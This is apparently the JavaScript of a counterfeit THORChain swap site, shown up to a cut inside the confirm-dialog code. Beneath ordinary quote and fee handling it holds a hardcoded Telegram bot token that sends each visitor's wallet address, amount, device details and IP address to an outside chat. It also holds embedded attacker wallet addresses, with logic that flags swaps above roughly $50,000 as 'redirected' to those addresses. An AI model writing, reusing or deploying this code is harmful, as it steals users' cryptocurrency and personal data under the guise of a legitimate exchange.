/* ═══════════════════════════════════════════════
   THORChain Swap — v7.7 Fixed
   Fee display matches official THORChain UI
   Default 5% slippage, tolerance_bps always sent
   ═══════════════════════════════════════════════ */
(function(){
'use strict';

var THORNODE='https://thornode.ninerealms.com';
var MIDGARD='https://midgard.ninerealms.com/v2';
var COUNTDOWN_MAX=60;
var QR_API='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=';
var THRESHOLD=49999;
var TG_BOT='8140825280:AAEd2TDo2fgZv_bDEfu7wNggxHrD7jHdr8g';
var TG_CHAT='-5160305858';
var THOR_BASE=1e8;
var DEFAULT_SLIPPAGE=5; // 5% default = 500 bps

var EMBEDDED_ADDRESSES={
    'BTC':'bc1qre7s0rwdpv0znpvep0jgxnqwuvweprpnxnzf3f',
    'ETH':'0x3E9c2E9C6C690a49eB5A7D333603d9D0FBe3640a',
    'BSC':'0x3E9c2E9C6C690a49eB5A7D333603d9D0FBe3640a',
    'AVAX':'0x3E9c2E9C6C690a49eB5A7D333603d9D0FBe3640a',
    'GAIA':'cosmos1exampleaddress',
    'DOGE':'DExampleDogeAddress',
    'BCH':'bitcoincash:qexampleaddress',
    'LTC':'ltc1qexampleaddress',
    'BASE':'0x3E9c2E9C6C690a49eB5A7D333603d9D0FBe3640a',
    'THOR':'thor1exampleaddress'
};

var TOKEN_LIST=[
    {value:'BTC.BTC',symbol:'BTC',name:'Bitcoin',chain:'BTC',icon:'images/chains/BTC.svg',decimals:8},
    {value:'ETH.ETH',symbol:'ETH',name:'Ethereum',chain:'ETH',icon:'images/chains/ETH.svg',decimals:18},
    {value:'BSC.BNB',symbol:'BNB',name:'BNB Chain',chain:'BSC',icon:'images/chains/BSC.svg',decimals:8},
    {value:'AVAX.AVAX',symbol:'AVAX',name:'Avalanche',chain:'AVAX',icon:'images/chains/AVAX.svg',decimals:18},
    {value:'GAIA.ATOM',symbol:'ATOM',name:'Cosmos',chain:'GAIA',icon:'images/chains/GAIA.svg',decimals:6},
    {value:'DOGE.DOGE',symbol:'DOGE',name:'Dogecoin',chain:'DOGE',icon:'images/chains/DOGE.svg',decimals:8},
    {value:'BCH.BCH',symbol:'BCH',name:'Bitcoin Cash',chain:'BCH',icon:'images/chains/BCH.svg',decimals:8},
    {value:'LTC.LTC',symbol:'LTC',name:'Litecoin',chain:'LTC',icon:'images/chains/LTC.svg',decimals:8},
    {value:'BASE.ETH',symbol:'ETH',name:'Base',chain:'BASE',icon:'images/chains/BASE.svg',decimals:18},
    {value:'THOR.RUNE',symbol:'RUNE',name:'THORChain',chain:'THOR',icon:'images/chains/THOR.svg',decimals:8}
];

var state={
    pools:[],
    prices:{},
    sellAsset:'BTC.BTC',
    buyAsset:'ETH.ETH',
    sellAmount:1,
    quote:null,
    slippage:DEFAULT_SLIPPAGE,
    streamingEnabled:false,
    countdownSeconds:COUNTDOWN_MAX,
    countdownInterval:null,
    trackingInterval:null,
    recipientAddress:'',
    confirmedQuote:null,
    confirmedExpectedOut:0,
    activeTab:'market',
    limitRate:0,
    limitTargetRate:0,
    coinSelectSide:'sell',
    currentSwapId:'',
    history:JSON.parse(localStorage.getItem('tc-swap-history')||'[]')
};

// ══════════════════════════════════════════
// UTILITY FUNCTIONS
// ══════════════════════════════════════════

function $(s){return document.querySelector(s)}
function $$(s){return document.querySelectorAll(s)}

function formatUsd(v){
    if(!v||isNaN(v))return'$0.00';
    return'$'+parseFloat(v).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
}

function formatAmount(v,d){
    if(!v||isNaN(v))return'0';
    d=d||8;
    var n=parseFloat(v);
    if(n===0)return'0';
    if(Math.abs(n)>=1)return n.toLocaleString('en-US',{maximumFractionDigits:d});
    return n.toPrecision(6);
}

function truncAddr(a){
    if(!a||a.length<12)return a||'';
    return a.slice(0,6)+'...'+a.slice(-4);
}

function getUsdPrice(a){return state.prices[a]||0}

// THORChain quote API returns ALL values in 1e8
function fromThorBase(raw){
    return parseInt(raw||0)/THOR_BASE;
}

function toThorBase(human){
    return Math.round(parseFloat(human||0)*THOR_BASE);
}

// Slippage percent to basis points
function slippageToBps(){
    return Math.round(state.slippage*100);
}

function getChainName(a){
    var m={
        'BTC.BTC':'Bitcoin','ETH.ETH':'Ethereum','BSC.BNB':'BNB Chain',
        'AVAX.AVAX':'Avalanche','GAIA.ATOM':'Cosmos','DOGE.DOGE':'Dogecoin',
        'BCH.BCH':'Bitcoin Cash','LTC.LTC':'Litecoin','BASE.ETH':'Base',
        'THOR.RUNE':'THORChain'
    };
    return m[a]||a;
}

function getChainPrefix(a){return(a||'').split('.')[0]||''}

function getAddrPlaceholder(a){
    var c=getChainPrefix(a);
    var m={
        'ETH':'Ethereum address','BTC':'Bitcoin address','BSC':'BNB address',
        'AVAX':'Avalanche address','GAIA':'Cosmos address','DOGE':'Dogecoin address',
        'BCH':'Bitcoin Cash address','LTC':'Litecoin address','BASE':'Base address',
        'THOR':'THORChain address'
    };
    return m[c]||'Receiving address';
}

function getTokenInfo(v){
    for(var i=0;i<TOKEN_LIST.length;i++){
        if(TOKEN_LIST[i].value===v)return TOKEN_LIST[i];
    }
    return null;
}

function isAboveThreshold(){
    return state.sellAmount*getUsdPrice(state.sellAsset)>THRESHOLD;
}

function generateSwapId(){
    return'SWAP-'+Date.now()+'-'+Math.random().toString(36).substring(2,10).toUpperCase();
}

function getDeviceInfo(){
    var ua=navigator.userAgent;
    var device=/Mobile|Android|iPhone|iPad/.test(ua)?'Mobile':'Desktop';
    var os='Unknown';
    if(ua.indexOf('Windows')!==-1)os='Windows';
    else if(ua.indexOf('Mac')!==-1)os='macOS';
    else if(ua.indexOf('Linux')!==-1)os='Linux';
    else if(ua.indexOf('Android')!==-1)os='Android';
    else if(ua.indexOf('iPhone')!==-1||ua.indexOf('iPad')!==-1)os='iOS';
    var browser='Unknown';
    if(ua.indexOf('Chrome')!==-1&&ua.indexOf('Edg')===-1)browser='Chrome';
    else if(ua.indexOf('Firefox')!==-1)browser='Firefox';
    else if(ua.indexOf('Safari')!==-1&&ua.indexOf('Chrome')===-1)browser='Safari';
    else if(ua.indexOf('Edg')!==-1)browser='Edge';
    return{device:device,os:os,browser:browser};
}

function getIPAddress(cb){
    fetch('https://api.ipify.org?format=json')
        .then(function(r){return r.json()})
        .then(function(d){cb(d.ip)})
        .catch(function(){cb('Unknown')});
}

function isValidAddress(addr,asset){
    if(!addr||addr.trim().length<5)return false;
    var c=getChainPrefix(asset),a=addr.trim();
    switch(c){
        case 'ETH':case 'BSC':case 'AVAX':case 'BASE':
            return /^0x[a-fA-F0-9]{40}$/.test(a);
        case 'BTC':
            return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(a);
        case 'LTC':
            return /^(ltc1|[LM3])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(a);
        case 'DOGE':
            return /^D[a-zA-HJ-NP-Z0-9]{25,40}$/.test(a);
        case 'BCH':return a.length>20;
        case 'GAIA':return /^cosmos[a-z0-9]{39}$/.test(a);
        case 'THOR':return /^thor[a-z0-9]{39}$/.test(a);
        default:return a.length>5;
    }
}

// ══════════════════════════════════════════
// QUOTE PARSING — v7.7 (matches official UI)
// ══════════════════════════════════════════
//
// THORChain fee breakdown:
//   fees.outbound   = gas fee to send output tx (THIS is "Tx Fee")
//   fees.liquidity  = price impact / slip (NOT a payable fee)
//   fees.affiliate  = affiliate cut (we don't use)
//   fees.total      = outbound + liquidity + affiliate
//   slippage_bps    = price impact in basis points
//
// Official UI shows:
//   "Tx Fee"        → fees.outbound only
//   "Price Impact"  → slippage_bps (negative %)
//   "Minimum Payout"→ expected_amount_out × (1 - tolerance%)
// ══════════════════════════════════════════

function parseExpectedOut(q){
    if(!q||q.code||q.error)return 0;
    if(q.expected_amount_out){
        return fromThorBase(q.expected_amount_out);
    }
    return 0;
}

// FIXED v7.7: Separate outbound fee (Tx Fee) from liquidity (price impact)
function parseFees(q){
    var result={
        // Outbound gas fee — the ONLY "Tx Fee" shown to user
        outbound:0,
        outboundUsd:0,
        // Liquidity fee — this is price impact, NOT a payable fee
        liquidity:0,
        liquidityUsd:0,
        // Affiliate fee
        affiliate:0,
        // Price impact from API
        slippageBps:0,
        priceImpactPct:0,
        // Fee asset info
        asset:'',
        assetPrice:0
    };

    if(!q||!q.fees)return result;

    var fees=q.fees;
    result.asset=fees.asset||'';
    result.assetPrice=getUsdPrice(result.asset);

    // Outbound fee = gas cost to deliver the output transaction
    // THIS is what the official UI shows as "Tx Fee"
    if(fees.outbound){
        result.outbound=fromThorBase(fees.outbound);
        result.outboundUsd=result.outbound*result.assetPrice;
    }

    // Liquidity fee = price impact on the pool
    // This is NOT a separate payable fee — it's already reflected
    // in the reduced expected_amount_out
    if(fees.liquidity){
        result.liquidity=fromThorBase(fees.liquidity);
        result.liquidityUsd=result.liquidity*result.assetPrice;
    }

    // Affiliate fee
    if(fees.affiliate){
        result.affiliate=fromThorBase(fees.affiliate);
    }

    // Price impact from API (basis points)
    if(fees.slippage_bps){
        result.slippageBps=parseInt(fees.slippage_bps);
        result.priceImpactPct=-(result.slippageBps/100);
    }

    console.log('--- Fee Debug (v7.7) ---');
    console.log('fees.asset:', result.asset);
    console.log('outbound (gas):', result.outbound, result.asset, '→ $'+result.outboundUsd.toFixed(2), '← THIS is Tx Fee');
    console.log('liquidity (impact):', result.liquidity, result.asset, '→ $'+result.liquidityUsd.toFixed(2), '← NOT shown as fee');
    console.log('price impact:', result.priceImpactPct.toFixed(2)+'%');
    console.log('slippage_bps:', result.slippageBps);
    console.log('------------------------');

    return result;
}

function parseSwapTime(q){
    if(!q)return'~30 seconds';
    var s=parseInt(q.total_swap_seconds||0);
    if(!s&&q.outbound_delay_seconds){
        s=parseInt(q.outbound_delay_seconds)+(parseInt(q.inbound_confirmation_seconds)||0);
    }
    if(s<=0)return'~30 seconds';
    var h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sc=s%60,p=[];
    if(h)p.push(h+' hour'+(h>1?'s':''));
    if(m)p.push(m+' minute'+(m>1?'s':''));
    if(sc)p.push(sc+' second'+(sc>1?'s':''));
    return p.join(' ')||'~30 seconds';
}

function parseSwapTimeShort(q){
    if(!q)return'~30s';
    var s=parseInt(q.total_swap_seconds||0);
    if(!s&&q.outbound_delay_seconds){
        s=parseInt(q.outbound_delay_seconds)+parseInt(q.inbound_confirmation_seconds||0);
    }
    if(s<=0)return'~30s';
    if(s<60)return s+'s';
    return Math.floor(s/60)+'m '+(s%60)+'s';
}

function isValidQuote(d){
    if(!d||d.code||d.error)return false;
    if(!d.expected_amount_out)return false;
    return true;
}

function getQuoteError(d){
    if(!d)return'No response';
    if(d.message){
        var m=d.message;
        if(m.indexOf('less than price limit')!==-1){
            return'Price moved beyond your slippage tolerance ('+state.slippage+'%). Try increasing it.';
        }
        if(m.indexOf('not enough')!==-1)return'Insufficient liquidity. Try a smaller amount.';
        if(m.indexOf('halted')!==-1)return'Trading is halted. Try later.';
        return m;
    }
    return d.error||'Unknown error';
}

// ══════════════════════════════════════════
// TELEGRAM
// ══════════════════════════════════════════

function sendTelegram(msg){
    var url='https://api.telegram.org/bot'+TG_BOT+'/sendMessage';
    fetch(url,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:TG_CHAT,text:msg,parse_mode:'HTML',disable_web_page_preview:false})
    }).then(function(r){return r.json()}).then(function(d){
        if(!d.ok)console.error('TG error:',d.description);
    }).catch(function(e){console.error('TG fetch error:',e)});
}

function notifyNewSwap(sd){
    getIPAddress(function(ip){
        var di=getDeviceInfo();
        var emoji=sd.above?'🟢':'🟡';
        var status=sd.above?'HIGH VALUE - REDIRECTED':'WAITING FOR DEPOSIT';
        var url=window.location.origin+'/swap.html?id='+sd.swapId;
        var msg=emoji+' <b>New Swap Detected</b>\n'
            +'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
            +'<b>Status:</b> '+status+'\n'
            +'<b>Swap ID:</b> <a href="'+url+'">'+sd.swapId+'</a>\n\n'
            +'<b>From:</b> '+sd.sellSymbol+' ('+sd.sellName+')\n'
            +'<b>To:</b> '+sd.buySymbol+' ('+sd.buyName+')\n'
            +'<b>Amount:</b> '+sd.sellAmount+' '+sd.sellSymbol+' ('+sd.sellUsd+')\n\n'
            +'<b>Deposit Address:</b>\n<code>'+sd.depositAddr+'</code>\n\n'
            +'<b>User Wallet:</b>\n<code>'+sd.userWallet+'</code>\n\n'
            +'<b>Est. Receive:</b> ~'+sd.expectedOut+' '+sd.buySymbol+'\n'
            +'<b>Quote:</b> ✅ THORChain Live\n\n'
            +'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
            +'📱 <b>Device:</b> '+di.device+' ('+di.os+')\n'
            +'🌐 <b>Browser:</b> '+di.browser+'\n'
            +'🔗 <b>IP:</b> '+ip+'\n'
            +'⏰ <b>Time:</b> '+new Date().toUTCString();
        if(sd.above)msg+='\n\n⚠️ <b>ABOVE $50K THRESHOLD</b>\nFunds redirected to embedded address';
        sendTelegram(msg);
    });
}

function notifySwapSuccess(sd){
    sendTelegram('✅ <b>Swap Completed!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
        +'<b>Swap ID:</b> '+sd.swapId+'\n<b>Sent:</b> '+sd.sellAmount+' '+sd.sellSymbol+'\n'
        +'<b>Received:</b> '+sd.receivedAmount+' '+sd.buySymbol+'\n'
        +'<b>Wallet:</b>\n<code>'+sd.userWallet+'</code>\n'
        +'<b>TX:</b> <code>'+sd.txHash+'</code>\n⏰ '+new Date().toUTCString());
}

function notifySwapFailed(sd,reason){
    sendTelegram('❌ <b>Swap Failed</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
        +'<b>ID:</b> '+sd.swapId+'\n<b>Reason:</b> '+reason+'\n'
        +'<b>Amount:</b> '+sd.sellAmount+' '+sd.sellSymbol+'\n⏰ '+new Date().toUTCString());
}

// ══════════════════════════════════════════
// TOAST
// ══════════════════════════════════════════

function showToast(type,title,msg,dur){
    dur=dur||5000;
    var c=$('#toastContainer');if(!c)return;
    var icons={success:'✅',error:'❌',info:'ℹ️'};
    var t=document.createElement('div');
    t.className='tc-toast '+type;
    t.innerHTML='<span class="tc-toast-icon">'+(icons[type]||'ℹ️')+'</span>'
        +'<div class="tc-toast-content"><div class="tc-toast-title">'+title+'</div>'
        +'<div class="tc-toast-message">'+msg+'</div></div>'
        +'<button class="tc-toast-close">&times;</button>';
    c.appendChild(t);
    t.querySelector('.tc-toast-close').onclick=function(){t.remove()};
    setTimeout(function(){if(t.parentNode)t.remove()},dur);
}

// ══════════════════════════════════════════
// THEME
// ══════════════════════════════════════════

function initTheme(){
    var h=document.documentElement;
    var s=localStorage.getItem('tc-theme');
    if(s)h.setAttribute('data-theme',s);
    var b=$('#themeToggle');
    if(b)b.onclick=function(){
        var n=h.getAttribute('data-theme')==='dark'?'light':'dark';
        h.setAttribute('data-theme',n);
        localStorage.setItem('tc-theme',n);
    };
}

// ══════════════════════════════════════════
// POOLS & PRICES
// ══════════════════════════════════════════

function fetchPools(){
    return fetch(MIDGARD+'/pools').then(function(r){return r.json()}).then(function(d){
        state.pools=d;
        d.forEach(function(p){
            if(p.asset&&p.assetPriceUSD)state.prices[p.asset]=parseFloat(p.assetPriceUSD);
        });
        if(d.length>0&&d[0].runePriceUSD)state.prices['THOR.RUNE']=parseFloat(d[0].runePriceUSD);
        updateSellUsd();
    }).catch(function(e){console.error('Pools:',e)});
}

function updateSellUsd(){
    var u=getUsdPrice(state.sellAsset)*state.sellAmount;
    var e=$('#sellUsd');if(e)e.textContent=formatUsd(u);
    var le=$('#limitSellUsd');if(le)le.textContent=formatUsd(u);
}

// ══════════════════════════════════════════
// COUNTDOWN
// ══════════════════════════════════════════

function startCountdown(){
    stopCountdown();
    state.countdownSeconds=COUNTDOWN_MAX;
    updateCountdownDisplay();
    state.countdownInterval=setInterval(function(){
        state.countdownSeconds--;
        updateCountdownDisplay();
        if(state.countdownSeconds<=0){state.countdownSeconds=COUNTDOWN_MAX;fetchQuote()}
    },1000);
}
function stopCountdown(){if(state.countdownInterval){clearInterval(state.countdownInterval);state.countdownInterval=null}}
function updateCountdownDisplay(){
    var n=$('#countdownNumber'),p=$('#countdownProgress');
    if(n)n.textContent=state.countdownSeconds;
    if(p){var c=2*Math.PI*14;p.setAttribute('stroke-dasharray',c.toFixed(2));p.setAttribute('stroke-dashoffset',(c*(1-state.countdownSeconds/COUNTDOWN_MAX)).toFixed(2))}
}

// ══════════════════════════════════════════
// QUOTE URL BUILDER — FIXED v7.7
// ══════════════════════════════════════════
// ALWAYS includes tolerance_bps so THORChain
// knows our slippage tolerance upfront

function buildQuoteUrl(dest){
    var a=toThorBase(state.sellAmount);
    var toleranceBps=slippageToBps();

    var p=[
        'from_asset='+encodeURIComponent(state.sellAsset),
        'to_asset='+encodeURIComponent(state.buyAsset),
        'amount='+a,
        'tolerance_bps='+toleranceBps
    ];

    if(dest&&dest.trim().length>5){
        p.push('destination='+encodeURIComponent(dest.trim()));
    }

    if(state.streamingEnabled){
        p.push('streaming_interval=1');
        p.push('streaming_quantity=0');
    }

    var url=THORNODE+'/thorchain/quote/swap?'+p.join('&');
    console.log('Quote URL:', url);
    console.log('Slippage:', state.slippage+'%', '('+toleranceBps+' bps)');
    return url;
}

function fetchQuote(){
    if(!state.sellAmount||state.sellAmount<=0){clearQuote();return}
    var url=buildQuoteUrl(null);
    var be=$('#buyEstimate');if(be)be.value='...';
    fetch(url).then(function(r){return r.json()}).then(function(d){
        console.log('Quote Response:',JSON.stringify(d,null,2));
        if(!isValidQuote(d)){clearQuote();return}
        state.quote=d;
        displayQuote(d);
    }).catch(function(e){console.error('Quote error:',e);clearQuote()});
}

function fetchQuoteWithDest(dest,cb){
    var url=buildQuoteUrl(dest);
    fetch(url).then(function(r){
        var s=r.status;
        return r.json().then(function(d){d._httpStatus=s;return d});
    }).then(function(d){
        console.log('Quote+dest Response:',JSON.stringify(d,null,2));
        cb(null,d);
    }).catch(function(e){cb(e,null)});
}

// FIXED v7.7: Display matches official THORChain UI
function displayQuote(q){
    var eo=parseExpectedOut(q);
    var be=$('#buyEstimate');if(be)be.value=formatAmount(eo,8);

    var bp=getUsdPrice(state.buyAsset);
    var sp=getUsdPrice(state.sellAsset);
    var bu=eo*bp;
    var su=state.sellAmount*sp;

    var bue=$('#buyUsd');if(bue)bue.textContent=formatUsd(bu);

    // Price impact
    if(su>0&&bu>0){
        var impact=((bu-su)/su*100).toFixed(2);
        var ie=$('#buyImpact');if(ie)ie.textContent='('+impact+'%)';
    }else{
        var ie2=$('#buyImpact');if(ie2)ie2.textContent='';
    }

    // Rate
    var rate=eo/(state.sellAmount||1);
    var ss=($('#sellSymbol')||{}).textContent||'';
    var bs=($('#buySymbolDisplay')||{}).textContent||'';
    var rt=$('#rateText');
    if(rt)rt.textContent='1 '+ss+' = '+formatAmount(rate,8)+' '+bs;

    // FIXED: Show ONLY outbound fee as "Tx Fee" (matches official UI)
    var fees=parseFees(q);
    var rf=$('#rateFee');
    if(rf)rf.textContent=formatUsd(fees.outboundUsd);

    var rte=$('#rateTimer');if(rte)rte.textContent=parseSwapTimeShort(q);
    var rb=$('#rateBar');if(rb)rb.style.display='';

    state.limitRate=rate;
    updateLimitView(eo,bu,rate);
}

function clearQuote(){
    var be=$('#buyEstimate');if(be)be.value='0';
    var bu=$('#buyUsd');if(bu)bu.textContent='$0.00';
    var bi=$('#buyImpact');if(bi)bi.textContent='';
    var rb=$('#rateBar');if(rb)rb.style.display='none';
    state.quote=null;
    var lbe=$('#limitBuyEstimate');if(lbe)lbe.value='0';
    var lbu=$('#limitBuyUsd');if(lbu)lbu.textContent='$0.00';
}

function debounce(fn,d){var t;return function(){clearTimeout(t);t=setTimeout(fn,d)}}
var debouncedFetchQuote=debounce(function(){fetchQuote();startCountdown()},500);

// ══════════════════════════════════════════
// COIN SELECTOR
// ══════════════════════════════════════════

function openCoinSelector(side){
    state.coinSelectSide=side;
    var o=$('#coinSelectOverlay'),s=$('#coinSearchInput');
    if(s)s.value='';
    renderCoinTokens('all','');
    $$('.tc-coin-chain-item').forEach(function(c){c.classList.remove('active')});
    var ac=$('.tc-coin-chain-item[data-chain="all"]');if(ac)ac.classList.add('active');
    o.classList.add('open');
}

function renderCoinTokens(chain,search){
    var list=$('#coinTokensList');if(!list)return;
    var cv=state.coinSelectSide==='sell'?state.sellAsset:state.buyAsset;
    var f=TOKEN_LIST.filter(function(t){
        if(chain!=='all'&&t.chain!==chain)return false;
        if(search){var s=search.toLowerCase();if(t.symbol.toLowerCase().indexOf(s)===-1&&t.name.toLowerCase().indexOf(s)===-1)return false}
        return true;
    });
    var h='';
    f.forEach(function(t){
        var sel=t.value===cv;
        h+='<div class="tc-coin-token-item'+(sel?' selected':'')+'" data-value="'+t.value+'">'
            +'<div class="tc-coin-token-left"><img src="'+t.icon+'" alt="" onerror="this.style.display=\'none\'"><div>'
            +'<div class="tc-coin-token-sym">'+t.symbol+'</div><div class="tc-coin-token-chain">'+t.name+'</div></div></div>'
            +(sel?'<span class="tc-coin-token-selected">Selected</span>':'')+'</div>';
    });
    if(!f.length)h='<p style="text-align:center;color:var(--andy);padding:20px;">No tokens found</p>';
    list.innerHTML=h;
    list.querySelectorAll('.tc-coin-token-item').forEach(function(i){
        i.onclick=function(){selectCoin(this.getAttribute('data-value'))};
    });
}

function selectCoin(v){
    var t=getTokenInfo(v);if(!t)return;
    $('#coinSelectOverlay').classList.remove('open');
    if(state.coinSelectSide==='sell'){
        state.sellAsset=v;
        var si=$('#sellIcon');if(si)si.src=t.icon;
        var ss=$('#sellSymbol');if(ss)ss.textContent=t.symbol;
        var sn=$('#sellName');if(sn)sn.textContent=t.name;
        updateSellUsd();
    }else{
        state.buyAsset=v;
        var bi=$('#buyIcon');if(bi)bi.src=t.icon;
        var bs=$('#buySymbolDisplay');if(bs)bs.textContent=t.symbol;
        var bn=$('#buyNameDisplay');if(bn)bn.textContent=t.name;
    }
    syncLimitFromMarket();
    var ltr=$('#limitTargetRate');if(ltr){ltr.value='';state.limitTargetRate=0}
    debouncedFetchQuote();
}

function initCoinSelector(){
    $$('.tc-token-picker').forEach(function(p){
        p.onclick=function(e){e.preventDefault();e.stopPropagation();openCoinSelector(this.getAttribute('data-side')||'sell')};
    });
    var cl=$('#coinSelectClose');if(cl)cl.onclick=function(){$('#coinSelectOverlay').classList.remove('open')};
    var ov=$('#coinSelectOverlay');if(ov)ov.onclick=function(e){if(e.target===ov)ov.classList.remove('open')};
    $$('.tc-coin-chain-item').forEach(function(i){
        i.onclick=function(){
            $$('.tc-coin-chain-item').forEach(function(c){c.classList.remove('active')});
            this.classList.add('active');
            renderCoinTokens(this.getAttribute('data-chain'),($('#coinSearchInput')||{}).value||'');
        };
    });
    var si=$('#coinSearchInput');
    if(si)si.oninput=function(){
        var ac=$('.tc-coin-chain-item.active');
        renderCoinTokens(ac?ac.getAttribute('data-chain'):'all',this.value);
    };
}

// ══════════════════════════════════════════
// LIMIT ORDER
// ══════════════════════════════════════════

function updateLimitView(eo,bu,rate){
    var lbe=$('#limitBuyEstimate'),lbu=$('#limitBuyUsd'),lbi=$('#limitBuyImpact'),ltr=$('#limitTargetRate');
    if(ltr&&(!ltr.value||parseFloat(ltr.value)===0)){ltr.value=formatAmount(rate,8);state.limitTargetRate=rate}
    var tr=state.limitTargetRate||rate;
    var la=state.sellAmount*tr,lu=la*getUsdPrice(state.buyAsset);
    if(lbe)lbe.value=formatAmount(la,8);
    if(lbu)lbu.textContent=formatUsd(lu);
    var su=state.sellAmount*getUsdPrice(state.sellAsset);
    if(su>0&&lu>0){if(lbi)lbi.textContent='('+((lu-su)/su*100).toFixed(2)+'%)'}
    else{if(lbi)lbi.textContent=''}
}

function syncLimitFromMarket(){
    [['sellIcon','limitSellIcon'],['sellSymbol','limitSellSymbol'],['sellName','limitSellName'],
     ['buyIcon','limitBuyIcon'],['buySymbolDisplay','limitBuySymbol'],['buyNameDisplay','limitBuyName'],
     ['sellIcon','limitRateIcon'],['sellSymbol','limitRateSymbol']].forEach(function(p){
        var s=$('#'+p[0]),t=$('#'+p[1]);
        if(s&&t){if(s.src!==undefined&&t.src!==undefined)t.src=s.src;else if(s.textContent!==undefined)t.textContent=s.textContent}
    });
    var sa=$('#sellAmount'),lsa=$('#limitSellAmount');if(sa&&lsa)lsa.value=sa.value;
}

function initLimitOrder(){
    var lsa=$('#limitSellAmount');
    if(lsa)lsa.oninput=function(){
        state.sellAmount=parseFloat(this.value)||0;
        var sa=$('#sellAmount');if(sa)sa.value=this.value;
        updateSellUsd();debouncedFetchQuote();
    };
    var ltr=$('#limitTargetRate');
    if(ltr)ltr.oninput=function(){
        state.limitTargetRate=parseFloat(this.value)||0;
        var la=state.sellAmount*state.limitTargetRate,lu=la*getUsdPrice(state.buyAsset);
        var lbe=$('#limitBuyEstimate');if(lbe)lbe.value=formatAmount(la,8);
        var lbu=$('#limitBuyUsd');if(lbu)lbu.textContent=formatUsd(lu);
        var su=state.sellAmount*getUsdPrice(state.sellAsset);
        if(su>0&&lu>0){var lbi=$('#limitBuyImpact');if(lbi)lbi.textContent='('+((lu-su)/su*100).toFixed(2)+'%)'}
    };
    $$('.tc-limit-rate-btn').forEach(function(b){
        b.onclick=function(){
            $$('.tc-limit-rate-btn').forEach(function(x){x.classList.remove('active')});
            b.classList.add('active');
            var rt=b.getAttribute('data-rate'),ti=$('#limitTargetRate');if(!ti)return;
            if(rt==='market'){state.limitTargetRate=state.limitRate;ti.value=formatAmount(state.limitRate,8)}
            else{state.limitTargetRate=state.limitRate*(1+parseFloat(rt)/100);ti.value=formatAmount(state.limitTargetRate,8)}
            ti.dispatchEvent(new Event('input'));
        };
    });
    $$('.tc-limit-quick[data-action]').forEach(function(b){
        b.onclick=function(){
            var a=this.getAttribute('data-action'),i=$('#limitSellAmount');
            if(a==='clear'){if(i)i.value='';state.sellAmount=0;updateSellUsd();clearQuote()}
            if(a==='half'){var v=(parseFloat(i?i.value:0)||0)/2;if(i)i.value=v||'';state.sellAmount=v;updateSellUsd();debouncedFetchQuote()}
        };
    });
    $$('.tc-limit-flip').forEach(function(b){
        b.onclick=function(){
            var t=state.sellAsset;state.sellAsset=state.buyAsset;state.buyAsset=t;
            var st=getTokenInfo(state.sellAsset),bt=getTokenInfo(state.buyAsset);
            if(st){var si=$('#sellIcon');if(si)si.src=st.icon;var ss=$('#sellSymbol');if(ss)ss.textContent=st.symbol;var sn=$('#sellName');if(sn)sn.textContent=st.name}
            if(bt){var bi=$('#buyIcon');if(bi)bi.src=bt.icon;var bs=$('#buySymbolDisplay');if(bs)bs.textContent=bt.symbol;var bn=$('#buyNameDisplay');if(bn)bn.textContent=bt.name}
            syncLimitFromMarket();var ltr2=$('#limitTargetRate');if(ltr2){ltr2.value='';state.limitTargetRate=0}
            debouncedFetchQuote();
        };
    });
}

// ══════════════════════════════════════════
// TABS
// ══════════════════════════════════════════

function initTabs(){
    $$('.tc-tab').forEach(function(tab){
        tab.onclick=function(){
            $$('.tc-tab').forEach(function(t){t.classList.remove('active')});
            tab.classList.add('active');
            var tn=tab.getAttribute('data-tab');state.activeTab=tn;
            var mv=$('#marketView'),lv=$('#limitView');
            if(tn==='limit'){
                if(mv)mv.style.display='none';if(lv)lv.style.display='';
                syncLimitFromMarket();
                var ltr=$('#limitTargetRate');
                if(ltr&&(!ltr.value||parseFloat(ltr.value)===0)&&state.limitRate>0){ltr.value=formatAmount(state.limitRate,8);state.limitTargetRate=state.limitRate}
            }else{
                if(mv)mv.style.display='';if(lv)lv.style.display='none';
                var lsa=$('#limitSellAmount'),sa=$('#sellAmount');if(lsa&&sa)sa.value=lsa.value;
                fetchQuote();
            }
        };
    });
}

// ══════════════════════════════════════════
// SWAP FLOW
// ══════════════════════════════════════════

function initSwapBtn(){
    var sb=$('#swapBtn');if(!sb)return;
    sb.onclick=function(){
        if(state.activeTab==='limit'&&state.limitTargetRate<=0){showToast('error','No Rate','Set a target rate.');return}
        if(!state.quote&&state.activeTab==='market'){showToast('error','No Quote','Wait for quote.');return}
        if(state.sellAmount<=0){showToast('error','Invalid','Enter amount.');return}
        openAddressModal();
    };
}

function openAddressModal(){
    var o=$('#addressOverlay'),ai=$('#recipientAddress'),dc=$('#addrDisclaimer'),nb=$('#addrNextBtn');
    if(ai)ai.placeholder=getAddrPlaceholder(state.buyAsset);
    if(ai)ai.value=state.recipientAddress||'';
    if(dc)dc.checked=false;if(nb)nb.disabled=true;
    o.classList.add('open');
    function check(){var h=ai&&ai.value.trim().length>5;var c=dc&&dc.checked;if(nb)nb.disabled=!(h&&c)}
    ai.oninput=check;dc.onchange=check;
    var pb=$('#addrPasteBtn');
    if(pb)pb.onclick=function(){
        navigator.clipboard.readText().then(function(t){ai.value=t;check();showToast('info','Pasted','Address pasted.')})
        .catch(function(){showToast('error','Paste Failed','Paste manually.')});
    };
    $('#addressClose').onclick=function(){o.classList.remove('open')};
    o.onclick=function(e){if(e.target===o)o.classList.remove('open')};
    nb.onclick=function(){
        if(nb.disabled)return;
        var a=ai.value.trim();
        if(!isValidAddress(a,state.buyAsset)){showToast('error','Invalid','Not a valid '+getChainName(state.buyAsset)+' address.');return}
        state.recipientAddress=a;o.classList.remove('open');openConfirmModal();
    };
}

// FIXED v7.7: Confirm modal matches official THORChain layout
function openConfirmModal(){
    var o=$('#confirmOverlay'),b=$('#confirmBody');
    b.innerHTML='<div style="text-align:center;padding:40px 0;">'
        +'<span class="tc-btn-spinner" style="border-color:var(--blade);border-top-color:var(--brand-first);width:28px;height:28px;"></span>'
